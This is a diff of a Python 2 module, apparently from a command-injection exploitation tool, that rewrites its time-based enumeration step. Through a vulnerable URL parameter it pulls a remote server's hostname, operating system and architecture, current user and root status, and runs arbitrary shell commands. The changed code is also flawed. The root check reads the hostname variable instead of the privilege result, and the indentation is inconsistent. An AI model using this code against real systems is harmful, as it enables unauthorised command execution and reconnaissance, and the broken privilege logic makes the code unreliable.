@@ -29,38 +29,71 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_in
 """
 
 def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell):
-
-  # Current user enumeration
-  if menu.options.current_user:
-    cmd = settings.CURRENT_USER
-    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    print "\n\n" + "  (+) Current User : "+ colors.YELLOW + colors.BOLD + output + colors.RESET + ""
-
-  # Is-root enumeration
-  if menu.options.is_root:
-    cmd = settings.ISROOT
-    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    sys.stdout.write( "\n\n" + "  (+) Current user have root privs :")
-    sys.stdout.flush()
-    if output != "0":
-      print colors.RED + " FALSE " + colors.RESET
-    else:
-      print colors.GREEN + " TRUE " + colors.RESET 
-
+      
   # Hostname enumeration
   if menu.options.hostname:
     cmd = settings.HOSTNAME
-    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    print "\n\n" + "  (+) Hostname : "+ colors.YELLOW + colors.BOLD +  output + colors.RESET + ""
+    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    shell = output 
+    if shell:
+      shell = "".join(str(p) for p in output)
+      sys.stdout.write(colors.BOLD + "\n\n  (!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".\n")
+      sys.stdout.flush()
+      
+  # "Retrieve certain system information (operating system, hardware platform)
+  if menu.options.sys_info:
+    cmd = settings.RECOGNISE_OS	    
+    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    target_os = output
+    if target_os:
+      target_os = "".join(str(p) for p in output)
+      if target_os == "Linux":
+	cmd = settings.RECOGNISE_HP
+	check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+	target_arch = output
+	if target_arch:
+	  target_arch = "".join(str(p) for p in target_arch)
+	  sys.stdout.write(colors.BOLD + "\n\n  (!) The target operating system is " + colors.UNDERL + target_os + colors.RESET)
+	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".\n")
+	  sys.stdout.flush()
+      else:
+	sys.stdout.write(colors.BOLD + "\n  (!) The target operating system is " + colors.UNDERL + target_os + colors.RESET + ".\n")
+	sys.stdout.flush()
 
+  # The current user enumeration
+  if menu.options.current_user:
+    cmd = settings.CURRENT_USER
+    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    cu_account = output
+    if cu_account:
+      cu_account = "".join(str(p) for p in output)
+      # Check if the user have super privilleges.
+      if menu.options.is_root:
+	cmd = settings.ISROOT
+	check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+	if shell:
+	  sys.stdout.write(colors.BOLD + "\n\n  (!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
+	  if shell != "0":
+	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
+	      sys.stdout.flush()
+	  else:
+	    sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
+	    sys.stdout.flush()
+      else:
+	sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET + ".")
+	sys.stdout.flush()
+	
+  print ""
   # Single os-shell execution
   if menu.options.os_shell:
     cmd =  menu.options.os_shell
-    check_how_long,output  = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
-    if menu.options.verbose:
-      print ""
-    print "\n\n" + colors.GREEN + colors.BOLD + output + colors.RESET
-    print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
-    sys.exit(0)
-    
+    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    shell = output
+    if shell:
+      if menu.options.verbose:
+	print ""
+      shell = "".join(str(p) for p in shell)
+      print "\n" + colors.GREEN + colors.BOLD + output + colors.RESET
+      sys.exit(0)
+
 # eof
